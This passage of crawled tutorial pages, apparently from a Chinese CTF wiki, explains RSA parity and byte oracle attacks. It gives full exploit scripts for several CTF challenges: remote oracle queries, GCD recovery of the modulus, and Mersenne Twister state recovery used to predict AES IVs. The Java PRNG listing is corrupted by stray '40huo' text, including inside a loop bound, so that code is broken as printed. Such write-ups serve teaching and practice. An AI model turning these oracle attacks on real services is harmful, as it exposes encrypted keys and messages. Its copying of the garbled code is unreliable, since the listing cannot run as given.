       (private_key.public_key().key_size // 8)), 'Ciphertext too large'\n  return pow(\n      int.from_bytes(ciphertext, 'big'),\n      private_key.private_numbers().d,\n      private_key.public_key().public_numbers().n)\n\n\ndef Challenge(private_key, reader, writer):\n  try:\n    m0 = reader.read(1)\n    m1 = reader.read(1)\n    ciphertext = reader.read(private_key.public_key().key_size // 8)\n    dice = RsaDecrypt(private_key, ciphertext)\n    for rounds in range(100):\n      p = [m0, m1][dice & 1]\n      k = random.randint(0, 2)\n      c = (ord(p) + k) % 2\n      writer.write(bytes((c,)))\n    writer.flush()\n    return 0\n\n  except Exception as e:\n    return 1\n\n\ndef main():\n  private_key = ReadPrivateKey(sys.argv[1])\n  return Challenge(private_key, sys.stdin.buffer, sys.stdout.buffer)\n\n\nif __name__ == '__main__':\n  sys.exit(main())\n```\n\n可以看出\n\n- 我们可以给服务器两个数，服务器会根据解密后的密文内容来决定使用哪一个。\n- 服务器会使用 `random.randint(0, 2)` 来生成随机数，并输出相关的随机 01 字节 c。\n\n乍一看，似乎是完全随机的，仔细查一下 `random.randint(0, 2)` 可以知道其生成随机数是包括边界的，因此其生成偶数的概率大于生成奇数的概率，那么 c 与 p 同奇偶的概率为 2/3。进而我们通过设置 m0 和 m1 就可以知道解密后的密文的最后一位是 0 还是 1 。这其实就是 RSA parity oracle。\n\nexp 如下\n\n```python\nimport gmpy2\nfrom pwn import *\nencflag = open('./flag.txt').read()\nencflag = encflag.encode('hex')\nencflag = int(encflag, 16)\n#context.log_level = 'debug'\nm = ['\\x00', '\\x07']\nn = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1\ne = 65537\nflag = \"\"\n\n\n\ndef guessvalue(cnt):\n    if cnt[0] > cnt[1]:\n        return 0\n    return 1\n\n\ni = 0\nwhile True:\n    cnt = dict()\n    cnt[0] = cnt[1] = 0\n    p = remote('perfect-secrecy.ctfcompetition.com', 1337)\n    p.send(m[0])\n    p.send(m[1])\n    tmp = pow(2, i)\n    two_inv = gmpy2.invert(tmp, n)\n    two_cipher = gmpy2.powmod(two_inv, e, n)\n    tmp = encflag * two_cipher % n\n    tmp = hex(tmp)[2:].strip('L')\n    tmp = '0' * (256 - len(tmp)) + tmp\n    tmp = tmp.decode('hex')\n    assert (len(tmp) == 128)\n    p.send(tmp)\n    #print tmp\n    data = \"\"\n    while (len(data) != 100):\n        data += p.recv()\n    for c in data:\n        cnt[u8(c)] += 1\n    p.close()\n    flag = str(guessvalue(cnt)) + flag\n    print i, flag\n    i += 1\n```\n\n结果如下\n\n```shell\n6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270 6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270\n```\n\n解码后就可以得到 flag\n\n```shell\nCTF{h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337}\n```\n\n### 题目\n\n- 2016 Plaid CTF rabit\n- 2016 sharif CTF lsb-oracle-150\n- 2018 Backdoor CTF  BIT-LEAKER\n- 2018 XMAN 选拔赛 baby RSA\n\n## RSA Byte Oracle\n\n假设目前存在一个 Oracle，它会对一个给定的密文进行解密，并且会给出明文的最后一个字节。那么给定一个加密后的密文，我们只需要 $\\log_{256}n$ 次就可以知道这个密文对应的明文消息。\n\n### 原理\n\n这个其实算作 RSA parity Oracle 的扩展，既然可以泄露出最后一个字节，那么按道理我们获取密文对应明文的次数应该可以减少。\n\n假设\n\n$C=P^e \\bmod N$\n\n第一次时，我们可以给服务器发送\n\n$C*256^e=(256P)^e \\bmod N$\n\n服务器会计算得到\n\n$256P \\bmod N$\n\n这里\n\n- 256P 是偶数。\n- N 是奇数，因为它是由两个大素数相乘得到。\n\n由于 P 一般是小于 N 的，那么$256P \\bmod N=256P-kn, k<256$。而且对于两个不同的 $k_1,k_2$，我们有\n\n$256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256$\n\n我们可以利用反证法来证明上述不等式。同时 $256P-kn$ 的最后一个字节其实就是 $-kn$ 在模 256 的情况下获取的。那么，其实我们可以首先枚举出 0~255 情况下的最后一个字节，构造一个 k 和最后一个字节的映射表 map\n\n当服务器返回最后一个字节 b，那么我们可以根据上述构造的映射表得知 k，即减去了 k 个N， 即 $kN \\leq 256 P \\leq (k+1)N$。\n\n此后，我们使用数学归纳法来获取 P 的范围，即假设在第 i 次时，$\\frac{xN}{256^{i}} \\leq P < \\frac{xN+N}{256^{i}}$\n\n进一步，在第 i+1 次时，我们可以发送\n\n$C*256^{(i+1)e}$\n\n服务器会计算得到\n\n$256^{i+1}P \\bmod N=256^{i+1}P-kN$\n\n$0 \\leq 256^{i+1}P-kN<N$ \n\n$\\frac{kN}{256^{i+1}} \\leq P < \\frac{kN+N}{256^{i+1}}$\n\n根据第 i 次的结果\n\n$\\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}}$\n\n我们这里可以假设 $k=256y+t$， 而这里的 t 就是我们可以通过映射表获取的。\n\n $\\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}}$\n\n与此同时，由于 P 必然存在，所以第 i+1 得到的这个范围和第 i 次得到的范围必然存在交集。\n\n所以 y 必然与 x 相等。\n\n进一步我们可以这么归纳，初始情况下\n\n```\nlb = 0\nub = N\n```\n\n假设服务器返回了 b，那么\n\n```c\nk = mab[b]\ninterval = (ub-lb)/256\nlb = lb + interval * k\nub = lb + interval\n```\n\n### 2018 HITCON lost key\n\n这是一个综合题目，首先没有给出 n，我们可以使用选择明文攻击的方式获取 n，当然我们也可以进一步获取 e，最后利用代码如下\n\n```python\nfrom pwn import *\nimport gmpy2\nfrom fractions import Fraction\np = process('./rsa.py')\n#p = remote('18.179.251.168', 21700)\n#context.log_level = 'debug'\np.recvuntil('Here is the flag!\\n')\nflagcipher = int(p.recvuntil('\\n', drop=True), 16)\n\n\ndef long_to_hex(n):\n    s = hex(n)[2:].rstrip('L')\n    if len(s) % 2: s = '0' + s\n    return s\n\n\ndef send(ch, num):\n    p.sendlineafter('cmd: ', ch)\n    p.sendlineafter('input: ', long_to_hex(num))\n    data = p.recvuntil('\\n')\n    return int(data, 16)\n\n\nif __name__ == \"__main__\":\n    # get n\n    cipher2 = send('A', 2)\n    cipher4 = send('A', 4)\n    nset = []\n    nset.append(cipher2 * cipher2 - cipher4)\n\n    cipher3 = send('A', 3)\n    cipher9 = send('A', 9)\n    nset.append(cipher3 * cipher3 - cipher9)\n    cipher5 = send('A', 5)\n    cipher25 = send('A', 25)\n    nset.append(cipher5 * cipher5 - cipher25)\n    n = nset[0]\n    for item in nset:\n        n = gmpy2.gcd(item, n)\n\n    # get map between k and return byte\n    submap = {}\n    for i in range(0, 256):\n        submap[-n * i % 256] = i\n\n    # get cipher256\n    cipher256 = send('A', 256)\n\n    back = flagcipher\n\n    L = Fraction(0, 1)\n    R = Fraction(1, 1)\n    for i in range(128):\n        print i\n        flagcipher = flagcipher * cipher256 % n\n        b = send('B', flagcipher)\n        k = submap[b]\n        L, R = L + (R - L) * Fraction(k, 256\n                                     ), L + (R - L) * Fraction(k + 1, 256)\n    low = int(L * n)\n    print long_to_hex(low - low % 256 + send('B', back)).decode('hex')\n```\n\n## RSA parity oracle variant\n### 原理\n如果oracle的参数会在一定时间、运行周期后改变，或者网络不稳定导致会话断开、重置，二分法就不再适用了，为了减少错误，应当考虑逐位恢复。\n要恢复明文的第2低位，考虑\n\n$$\\{(c(2^{-1*e_1}\\mod N_1))^{d_1}\\mod N_1\\}\\pmod2\\equiv m*2^{-1}$$\n\n$$\n\\begin{aligned}\n&m*(2^{-1}\\mod N_1)\\mod2\\\\\n&=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-1}\\mod2\\\\\n&=[2(\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1})+a_0*2^0]*2^{-1}\\mod 2\\\\\n&=\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1}+a_0*2^0*2^{-1}\\mod2\\\\\n&\\equiv a_1+a_0*2^0*2^{-1}\\equiv y\\pmod2\n\\end{aligned}\n$$\n\n$$\ny-(a_0*2^0)*2^{-1}=(m*2^{-1}\\mod2)-(a_0*2^0)*2^{-1}\\equiv a_1\\pmod2\n$$\n\n类似的\n\n$$\\{(c(2^{-2*e_2}\\mod N_2))^{d_2}\\mod N_2\\}\\pmod2\\equiv m*2^{-2}$$\n\n$$\n\\begin{aligned}\n&m*(2^{-2}\\mod N_2)\\mod2\\\\\n&=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-2}\\mod2\\\\\n&=[2^2(\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-2})+a_1*2^1+a_0*2^0]*2^{-2}\\mod 2\\\\\n&=\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-1}+(a_1*2^1+a_0*2^0)*2^{-2}\\mod2\\\\\n&\\equiv a_2+(a_1*2^1+a_0*2^0)*2^{-2}\\equiv y\\pmod2\n\\end{aligned}\n$$\n\n$$\n\\begin{aligned}\n    &y-(a_1*2^1+a_0*2^0)*2^{-2}\\\\\n    &=(m*2^{-2}\\mod2)-(a_1*2^1+a_0*2^0)*2^{-2}\\equiv a_2\\pmod2\n\\end{aligned}\n$$\n\n我们就可以使用前i-1位与oracle的结果来得到第i位。注意这里的$2^{-1}$是$2^1$模$N_1$的逆元。所以对剩下的位，有\n\n$$\n\\begin{aligned}\n    &\\{(c(2^{-i*e_i}\\mod N_i))^{d_i}\\mod N_i\\}\\pmod2\\equiv m*2^{-i}\\\\\n    &a_i\\equiv (m*2^{-i}\\mod2) -\\sum_{j=0}^{i-1}a_j*2^j\\pmod2,i=1,2,...,logm-1\n\\end{aligned}\n$$\n\n其中$2^{-i}$是$2^i$模$N_i$的逆元。\n\n就可以逐步恢复原文所有的位信息了。这样的时间复杂度为$O(logm)$。\n\nexp:\n```python\nfrom Crypto.Util.number import *\nmm = bytes_to_long(b'12345678')\nl = len(bin(mm)) - 2\n\ndef genkey():\n    while 1:\n        p = getPrime(128)\n        q = getPrime(128)\n        e = getPrime(32)\n        n = p * q\n        phi = (p - 1) * (q - 1)\n        if GCD(e, phi) > 1:\n            continue\n        d = inverse(e, phi)\n        return e, d, n\n\ne, d, n = genkey()\ncc = pow(mm, e, n)\nf = str(pow(cc, d, n) % 2)\n\nfor i in range(1, l):\n    e, d, n = genkey()\n    cc = pow(mm, e, n)\n    ss = inverse(2**i, n)\n    cs = (cc * pow(ss, e, n)) % n\n    lb = pow(cs, d, n) % 2\n    bb = (lb - (int(f, 2) * ss % n)) % 2\n    f = str(bb) + f\n    assert(((mm >> i) % 2) == bb)\nprint(long_to_bytes(int(f, 2)))\n```\n\n## 参考\n\n- https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack\n- https://pastebin.com/KnEUSMxp\n- https://github.com/ashutosh1206/Crypton\n", "timestamp": "2025-10-21T22:02:48.367830"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/rsa_complex.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/rsa_complex.md", "content": "# RSA 复杂题目\n\n## 2018 Tokyo Western Mixed Cipher\n\n题目给的信息如下所示：\n\n\n- 每次交互可以维持的时间长度约为 5 分钟\n- 每次交互中中n是确定的 1024 bit，但是未知， e 为 65537\n- 使用 aes 加密了 flag，密钥和 IV 均不知道\n- 每次密钥是固定的，但是 IV 每次都会随机\n- 可以使用 encrypt 功能随意使用 rsa 和 aes 进行加密，其中每次加密都会对 aes 的 iv 进行随机\n- 可以使用 decrypt 对随意的密文进行解密，但是只能知道最后一个字节是什么\n- 可以使用 print_flag 获取 flag 密文\n- 可以使用 print_key 获取 rsa 加密的 aes 密钥\n\n本题目看似一个题目，实则是 3 个题目，需要分步骤解决。在此之前，我們準備好交互的函數\n\n```python\ndef get_enc_key(io):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"4\")\n    io.read_until(\"here is encrypted key :)n\")\n    c=int(io.readline()[:-1],16)\n    return c\n\ndef encrypt_io(io,p):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"1\")\n    io.read_until(\"input plain text: \")\n    io.writeline(p)\n    io.read_until(\"RSA: \")\n    rsa_c=int(io.readline()[:-1],16)\n    io.read_until(\"AES: \")\n    aes_c=io.readline()[:-1].decode(\"hex\")\n    return rsa_c,aes_c\n\ndef decrypt_io(io,c):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"2\")\n    io.read_until(\"input hexencoded cipher text: \")\n    io.writeline(long_to_bytes(c).encode(\"hex\"))\n    io.read_until(\"RSA: \")\n    return io.read_line()[:-1].decode(\"hex\")\n```\n\n### GCD attack n\n\n第一步我们需要把没有给出的 n 算出来，因为我们可以利用 encrypt 功能对我们输入的明文 x 进行 rsa 加密，那么可以利用整除的性质算 n\n\n```python\n因为x ^ e = c mod n\n所以 n | x ^ e - c\n```\n我们可以构造足够多的 x，算出最够多的 x ^ e - c，从而计算最大公约数，得到 n。\n\n```\ndef get_n(io):\n    rsa_c,aes_c=encrypt_io(io,long_to_bytes(2))\n    n=pow(2,65537)-rsa_c\n    for i in range(3,6):\n        rsa_c, aes_c = encrypt_io(io, long_to_bytes(i))\n        n=primefac.gcd(n,pow(i,65537)-rsa_c)\n    return n\n```\n\n可以利用加密进行 check\n\n```python\ndef check_n(io,n):\n    rsa_c, aes_c = encrypt_io(io, \"123\")\n    if pow(bytes_to_long(\"123\"), e, n)==rsa_c:\n        return True\n    else:\n        return False\n```\n\n### RSA parity oracle\n\n利用 leak 的的最后一个字节，我们可以进行选择密文攻击，使用 RSA parity oracle 回复 aes 的秘钥\n\n```python\ndef guess_m(io,n,c):\n    k=1\n    lb=0\n    ub=n\n    while ub!=lb:\n        print lb,ub\n        tmp = c * gmpy2.powmod(2, k*e, n) % n\n        if ord(decrypt_io(io,tmp)[-1])%2==1:\n            lb = (lb + ub) / 2\n        else:\n            ub = (lb + ub) / 2\n        k+=1\n    print ub,len(long_to_bytes(ub))\n    return ub\n```\n\n### PRNG Predict\n\n这里我们可以解密 flag 的16字节之后的内容了，但是前16个字节没有 IV 是解密不了的。这时我们可以发现，IV 生成使用的随机数使用了 getrandbits，并且我们可以获取到足够多的随机数量，那么我们可以进行 PRNG 的 predict，从而直接获取随机数\n\n这里使用了一个现成的的 java 进行 PRNG 的 Predict\n\n```java\npublic class Main {\n\n   static int[] state;\n   static int currentIndex;\n40huo\n   public static void main(String[] args) {\n      state = new int[624];\n      currentIndex = 0;\n\n//    initialize(0);\n\n//    for (int i = 0; i < 5; i++) {\n//       System.out.println(state[i]);\n//    }\n\n      // for (int i = 0; i < 5; i++) {\n      // System.out.println(nextNumber());\n      // }\n\n      if (args.length != 624) {\n         System.err.println(\"must be 624 args\");\n         System.exit(1);\n      }\n      int[] arr = new int[624];\n      for (int i = 0; i < args.length; i++) {\n         arr[i] = Integer.parseInt(args[i]);\n      }\n\n\n      rev(arr);\n\n      for (int i = 0; i < 6240huo4; i++) {\n         System.out.println(state[i]);\n      }\n\n//    System.out.println(\"currentIndex \" + currentIndex);\n//    System.out.println(\"state[currentIndex] \" + state[currentIndex]);\n//    System.out.println(\"next \" + nextNumber());\n\n      // want -2065863258\n   }\n\n   static void nextState() {\n      // Iterate through the state\n      for (int i = 0; i < 624; i++) {\n         // y is the first bit of the current number,\n         // and the last 31 bits of the next number\n         int y = (state[i] & 0x80000000)\n               + (state[(i + 1) % 624] & 0x7fffffff);\n         // first bitshift y by 1 to the right\n         int next = y >>> 1;\n         // xor it with the 397th next number\n         next ^= state[(i + 397) % 624];\n         // if y is odd, xor with magic number\n         if ((y & 1L) == 1L) {\n            next ^= 0x9908b0df;\n         }\n         // now we have the result\n         state[i] = next;\n      }\n   }\n\n   static int nextNumber() {\n      currentIndex++;\n      int tmp = state[currentIndex];\n      tmp ^= (tmp >>> 11);\n      tmp ^= (tmp << 7) & 0x9d2c5680;\n      tmp ^= (tmp << 15) & 0xefc60000;\n      tmp ^= (tmp >>> 18);\n      return tmp;\n   }\n\n   static void initialize(int seed) {\n\n      // http://code.activestate.com/recipes/578056-mersenne-twister/\n\n      // global MT\n      // global bitmask_1\n      // MT[0] = seed\n      // for i in xrange(1,624):\n      // MT[i] = ((1812433253 * MT[i-1]) ^ ((MT[i-1] >> 30) + i)) & bitmask_1\n\n      // copied Python 2.7's impl (probably uint problems)\n      state[0] = seed;\n      for (int i = 1; i < 624; i++) {\n         state[i] = ((1812433253 * state[i - 1]) ^ ((state[i - 1] >> 30) + i)) & 0xffffffff;\n      }\n   }\n\n   static int unBitshiftRightXor(int value, int shift) {\n      // we part of the value we are up to (with a width of shift bits)\n      int i = 0;\n      // we accumulate the result here\n      int result = 0;\n      // iterate until we've done the full 32 bits\n      while (i * shift < 32) {\n         // create a mask for this part\n         int partMask = (-1 << (32 - shift)) >>> (shift * i);\n         // obtain the part\n         int part = value & partMask;\n         // unapply the xor from the next part of the integer\n         value ^= part >>> shift;\n         // add the part to the result\n         result |= part;\n         i++;\n      }\n      return result;\n   }\n\n   static int unBitshiftLeftXor(int value, int shift, int mask) {\n      // we part of the value we are up to (with a width of shift bits)\n      int i = 0;\n      // we accumulate the result here\n      int result = 0;\n      // iterate until we've done the full 32 bits\n      while (i * shift < 32) {\n         // create a mask for this part\n         int partMask = (-1 >>> (32 - shift)) << (shift * i);\n         // obtain the part\n         int part = value & partMask;\n         // unapply the xor from the next part of the integer\n         value ^= (part << shift) & mask;\n         // add the part to the result\n         result |= part;\n         i++;\n      }\n      return result;\n   }\n\n   static void rev(int[] nums) {\n      for (int i = 0; i < 624; i++) {\n\n         int value = nums[i];\n         value = unBitshiftRightXor(value, 18);\n         value = unBitshiftLeftXor(value, 15, 0xefc60000);\n         value = unBitshiftLeftXor(value, 7, 0x9d2c5680);\n         value = unBitshiftRightXor(value, 11);\n\n         state[i] = value;\n      }\n   }\n}\n```\n\n写了一个 python 直接调用 java\n\n```\nfrom Crypto.Util.number import long_to_bytes,bytes_to_long\n\n\n\ndef encrypt_io(io,p):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"1\")\n    io.read_until(\"input plain text: \")\n    io.writeline(p)\n    io.read_until(\"RSA: \")\n    rsa_c=int(io.readline()[:-1],16)\n    io.read_until(\"AES: \")\n    aes_c=io.readline()[:-1].decode(\"hex\")\n    return rsa_c,aes_c\nimport subprocess\nimport random\ndef get_iv(io):\n    rsa_c, aes_c=encrypt_io(io,\"1\")\n    return bytes_to_long(aes_c[0:16])\ndef splitInto32(w128):\n    w1 = w128 & (2**32-1)\n    w2 = (w128 >> 32) & (2**32-1)\n    w3 = (w128 >> 64) & (2**32-1)\n    w4 = (w128 >> 96)\n    return w1,w2,w3,w4\ndef sign(iv):\n    # converts a 32 bit uint to a 32 bit signed int\n    if(iv&0x80000000):\n        iv = -0x100000000 + iv\n    return iv\ndef get_state(io):\n    numbers=[]\n    for i in range(156):\n        print i\n        numbers.append(get_iv(io))\n    observedNums = [sign(w) for n in numbers for w in splitInto32(n)]\n    o = subprocess.check_output([\"java\", \"Main\"] + map(str, observedNums))\n    stateList = [int(s) % (2 ** 32) for s in o.split()]\n    r = random.Random()\n    state = (3, tuple(stateList + [624]), None)\n    r.setstate(state)\n    return r.getrandbits(128)\n```\n\n### EXP\n\n整体攻击代码如下：\n\n```python\nfrom zio import *\nimport primefac\nfrom Crypto.Util.number import long_to_bytes,bytes_to_long\ntarget=(\"crypto.chal.ctf.westerns.tokyo\",5643)\ne=65537\n\ndef get_enc_key(io):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"4\")\n    io.read_until(\"here is encrypted key :)n\")\n    c=int(io.readline()[:-1],16)\n    return c\n\ndef encrypt_io(io,p):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"1\")\n    io.read_until(\"input plain text: \")\n    io.writeline(p)\n    io.read_until(\"RSA: \")\n    rsa_c=int(io.readline()[:-1],16)\n    io.read_until(\"AES: \")\n    aes_c=io.readline()[:-1].decode(\"hex\")\n    return rsa_c,aes_c\n\ndef decrypt_io(io,c):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"2\")\n    io.read_until(\"input hexencoded cipher text: \")\n    io.writeline(long_to_bytes(c).encode(\"hex\"))\n    io.read_until(\"RSA: \")\n    return io.read_line()[:-1].decode(\"hex\")\n\ndef get_n(io):\n    rsa_c,aes_c=encrypt_io(io,long_to_bytes(2))\n    n=pow(2,65537)-rsa_c\n    for i in range(3,6):\n        rsa_c, aes_c = encrypt_io(io, long_to_bytes(i))\n        n=primefac.gcd(n,pow(i,65537)-rsa_c)\n    return n\n\ndef check_n(io,n):\n    rsa_c, aes_c = encrypt_io(io, \"123\")\n    if pow(bytes_to_long(\"123\"), e, n)==rsa_c:\n        return True\n    else:\n        return False\n\n\nimport gmpy2\ndef guess_m(io,n,c):\n    k=1\n    lb=0\n    ub=n\n    while ub!=lb:\n        print lb,ub\n        tmp = c * gmpy2.powmod(2, k*e, n) % n\n        if ord(decrypt_io(io,tmp)[-1])%2==1:\n            lb = (lb + ub) / 2\n        else:\n            ub = (lb + ub) / 2\n        k+=1\n    print ub,len(long_to_bytes(ub))\n    return ub\n\n\nio = zio(target, timeout=10000, print_read=COLORED(NONE, 'red'),print_write=COLORED(NONE, 'green'))\nn=get_n(io)\nprint check_n(io,n)\nc=get_enc_key(io)\nprint len(decrypt_io(io,c))==16\n\n\nm=guess_m(io,n,c)\nfor i in range(m - 50000,m+50000):\n    if pow(i,e,n)==c:\n        aeskey=i\n        print long_to_bytes(aeskey)[-1]==decrypt_io(io,c)[-1]\n        print \"found aes key\",hex(aeskey)\n\nimport fuck_r\nnext_iv=fuck_r.get_state(io)\nprint \"##########################################\"\nprint next_iv\nprint aeskey\nio.interact()\n```\n\n\n## 2016 ASIS Find the flag\n\n这里我们以 ASIS 2016 线上赛中 Find the flag 为例进行介绍。\n\n文件解压出来，有一个密文，一个公钥，一个 py 脚本。看一下公钥。\n\n```bash\n➜  RSA openssl rsa -pubin -in pubkey.pem -text -modulus\nPublic-Key: (256 bit)\nModulus:\n    00:d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d:\n    f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f:\n    20:61:b9\nExponent: 12405943493775545863 (0xac2ac3e0ca0f5607)\nModulus=D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9\n```\n\n这么小的一个 $N$，先分解一下。\n\n```\np = 311155972145869391293781528370734636009\nq = 315274063651866931016337573625089033553\n```\n\n再看给的 py 脚本。\n\n```python\n#!/usr/bin/python\nimport gmpy\nfrom Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\n\nflag = open('flag', 'r').read() * 30\n\ndef ext_rsa_encrypt(p, q, e, msg):\n    m = bytes_to_long(msg)\n    while True:\n        n = p * q\n        try:\n            phi = (p - 1)*(q - 1)\n            d = gmpy.invert(e, phi)\n            pubkey = RSA.construct((long(n), long(e)))\n            key = PKCS1_v1_5.new(pubkey)\n            enc = key.encrypt(msg).encode('base64')\n            return enc\n        except:\n            p = gmpy.next_prime(p**2 + q**2)\n            q = gmpy.next_prime(2*p*q)\n            e = gmpy.next_prime(e**2)\n\np = getPrime(128)\nq = getPrime(128)\nn = p*q\ne = getPrime(64)\npubkey = RSA.construct((long(n), long(e)))\nf = open('pubkey.pem', 'w')\nf.write(pubkey.exportKey())\ng = open('flag.enc', 'w')\ng.write(ext_rsa_encrypt(p, q, e, flag))\n```\n\n逻辑很简单，读取 flag，重复 30 遍为密文。随机取 $p$ 和 $q$，生成一个公钥，写入 `pubkey.pem`，再用脚本中的 `ext_rsa_encrypt` 函数进行加密，最后将密文写入 `flag.enc`。\n\n尝试一下解密，提示密文过长，再看加密函数，原来当加密失败时，函数会跳到异常处理，以一定算法重新取更大的 $p$ 和 $q$，直到加密成功。\n\n那么我们只要也写一个相应的解密函数即可。\n\n```python\n#!/usr/bin/python\nimport gmpy\nfrom Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\n\ndef ext_rsa_decrypt(p, q, e, msg):\n    m = bytes_to_long(msg)\n    while True:\n        n = p * q\n        try:\n            phi = (p - 1)*(q - 1)\n            d = gmpy.invert(e, phi)\n            privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))\n            key = PKCS1_v1_5.new(privatekey)\n            de_error = ''\n            enc = key.decrypt(msg.decode('base64'), de_error)\n            return enc\n        except Exception as error:\n            print error\n            p = gmpy.next_prime(p**2 + q**2)\n            q = gmpy.next_prime(2*p*q)\n            e = gmpy.next_prime(e**2)\n\np = 311155972145869391293781528370734636009\nq = 315274063651866931016337573625089033553\nn = p*q\ne = 12405943493775545863 \n# pubkey = RSA.construct((long(n), long(e)))\n# f = open('pubkey.pem', 'w')\n# f.write(pubkey.exportKey())\ng = open('flag.enc', 'r')\nmsg = g.read()\nflag = ext_rsa_decrypt(p, q, e, msg)\nprint flag\n```\n\n拿到 flag\n\n```\nASIS{F4ct0R__N_by_it3rat!ng!}\n```\n\n## SCTF RSA1\n\n这里我们以 SCTF RSA1 为例进行介绍，首先解压压缩包后，得到如下文件\n\n```shell\n➜  level0 git:(master) ✗ ls -al\n总用量 4\ndrwxrwxrwx 1 root root    0 7月  30 16:36 .\ndrwxrwxrwx 1 root root    0 7月  30 16:34 ..\n-rwxrwxrwx 1 root root  349 5月   2  2016 level1.passwd.enc\n-rwxrwxrwx 1 root root 2337 5月   6  2016 level1.zip\n-rwxrwxrwx 1 root root  451 5月   2  2016 public.key\n```\n\n尝试解压缩了一下 level1.zip 现需要密码。然后根据 level1.passwd.enc 可知，应该是我们需要解密这个文件才能得到对应的密码。查看公钥\n\n```shell\n➜  level0 git:(master) ✗ openssl rsa -pubin -in public.key -text -modulus \nPublic-Key: (2048 bit)\nModulus:\n    00:94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8:\n    89:d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c:\n    70:87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c:\n    5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6:\n    bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8:\n    fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21:\n    ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a:\n    2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8:\n    72:1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5:\n    16:36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac:\n    c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7:\n    31:56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49:\n    cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69:\n    d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b:\n    86:94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20:\n    eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46:\n    b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06:\n    68:81\nExponent: 65537 (0x10001)\nModulus=94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlKA+bg7c8nQQUu8e6qiJ\n1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W\nk5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe\nRRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr\nV/XXUtcxVgurCuaNrQgiqR/LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG\nZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo\ngQIDAQAB\n-----END PUBLIC 